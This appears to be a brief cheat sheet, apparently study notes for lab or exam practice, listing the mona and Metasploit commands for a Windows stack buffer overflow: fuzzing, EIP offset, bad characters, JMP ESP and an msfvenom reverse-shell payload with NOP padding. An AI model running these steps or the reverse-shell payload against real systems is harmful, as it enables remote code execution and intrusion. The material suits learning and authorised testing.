# mona - <https://github.com/corelan/mona>

```bash
Mona Configuration
		○ !mona config -set workingfolder c:\mona\%p
Fuzzing
		○ fuzzing.py
Crash Replication & Controlling EIP
		○ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
		○ exploit.py 
		○ !mona findmsp -distance 600
Finding Bad Characters
		○ !mona bytearray -b "\x00"
		○ RESTART
		○ !mona compare -f C:\mona\tst\bytearray.bin -a <address>
		○ !mona bytearray -b "\x00\x??\x??"
		○ RESTART
		○ !mona compare -f C:\mona\tst\bytearray.bin -a <address>
Finding a Jump Point
		○ !mona jmp -r esp -cpb "\x00\x??\x??"  
Generate Payload
		○ msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4444 EXITFUNC=thread -b "\x00\x??\x??" -f c
Prepend NOPs
		○ padding = "\x90" * 16
Exploit
```
